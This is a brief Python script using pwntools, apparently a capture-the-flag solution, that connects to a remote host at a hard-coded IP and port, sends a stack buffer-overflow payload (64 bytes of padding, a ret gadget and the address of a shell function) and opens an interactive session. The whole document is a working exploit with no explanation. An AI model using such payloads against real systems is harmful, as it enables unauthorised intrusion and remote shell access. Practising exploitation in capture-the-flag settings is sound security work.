from pwn import*
 
p=remote("34.123.15.202",5000)


shell=p64(0x0000000000401136)
ret=p64(0x0000000000401175)
payload=b"A"*64+ret+shell


p.sendline(payload)

p.interactive()